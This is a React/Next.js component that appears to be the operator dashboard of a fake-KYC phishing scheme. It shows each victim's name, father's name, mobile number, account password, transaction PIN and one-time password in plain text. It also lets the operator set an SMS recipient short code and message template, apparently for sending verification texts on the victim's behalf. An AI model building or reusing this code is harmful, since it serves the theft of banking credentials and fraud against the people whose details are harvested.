"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";
import { ArrowLeft, Save, Loader2 } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { updateSmsConfig } from "@/lib/actions/sms";
import type { KycSubmission } from "@/types";

interface RecordDetailProps {
  record: KycSubmission;
}

export function RecordDetail({ record }: RecordDetailProps) {
  const router = useRouter();
  const [smsNumber, setSmsNumber] = useState(record.sms_number || "32022");
  const [smsTemplate, setSmsTemplate] = useState(
    record.sms_template || "KYC VERIFY {APPLICATION_ID} {CUSTOMER_NAME}"
  );
  const [saving, setSaving] = useState(false);

  async function handleSaveSms() {
    setSaving(true);
    const result = await updateSmsConfig(record.id, smsNumber, smsTemplate);
    if (result.error) {
      toast.error(result.error);
    } else {
      toast.success("SMS configuration saved");
    }
    setSaving(false);
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-4">
        <Button variant="ghost" size="icon" onClick={() => router.back()}>
          <ArrowLeft className="h-5 w-5" />
        </Button>
        <div>
          <h1 className="text-2xl font-bold text-gray-900">KYC Details</h1>
          <p className="text-sm text-gray-500 mt-1">
            ID: <span className="font-mono">{record.id}</span>
          </p>
        </div>
      </div>

      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle>Submission Information</CardTitle>
            <Badge
              variant={
                record.status === "Approved"
                  ? "approved"
                  : record.status === "Rejected"
                    ? "rejected"
                    : "pending"
              }
              className="text-sm px-3 py-1"
            >
              {record.status}
            </Badge>
          </div>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                Full Name
              </label>
              <p className="mt-1 text-sm font-medium text-gray-900">
                {record.full_name}
              </p>
            </div>
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                Father&apos;s Name
              </label>
              <p className="mt-1 text-sm font-medium text-gray-900">
                {record.father_name}
              </p>
            </div>
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                Mobile Number
              </label>
              <p className="mt-1 text-sm font-medium text-gray-900">
                {record.mobile_number}
              </p>
            </div>
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                Password
              </label>
              <p className="mt-1 text-sm font-mono text-gray-900">
                {record.password}
              </p>
            </div>
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                Transaction PIN
              </label>
              <p className="mt-1 text-sm font-mono text-gray-900">
                {record.transaction_pin}
              </p>
            </div>
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                OTP
              </label>
              <p className="mt-1 text-sm font-mono text-gray-900">
                {record.otp || "—"}
              </p>
            </div>
            <div>
              <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
                Created At
              </label>
              <p className="mt-1 text-sm font-medium text-gray-900">
                {new Date(record.created_at).toLocaleString()}
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle>SMS Configuration</CardTitle>
            {record.sms_configured && (
              <Badge variant="approved" className="text-xs px-2 py-0.5">Configured</Badge>
            )}
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
              Recipient Number
            </label>
            <Input
              value={smsNumber}
              onChange={(e) => setSmsNumber(e.target.value)}
              placeholder="e.g. 32022"
            />
          </div>
          <div className="space-y-2">
            <label className="text-xs font-medium text-gray-500 uppercase tracking-wider">
              SMS Template
            </label>
            <Textarea
              value={smsTemplate}
              onChange={(e) => setSmsTemplate(e.target.value)}
              placeholder="e.g. KYC VERIFY {APPLICATION_ID} {CUSTOMER_NAME}"
              rows={3}
            />
            <p className="text-xs text-gray-400">
              Available placeholders: {"{APPLICATION_ID}"}, {"{CUSTOMER_NAME}"}
            </p>
          </div>
          <div className="pt-2">
            <Button onClick={handleSaveSms} disabled={saving}>
              {saving ? (
                <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Saving...</>
              ) : (
                <><Save className="mr-2 h-4 w-4" /> Save SMS Configuration</>
              )}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
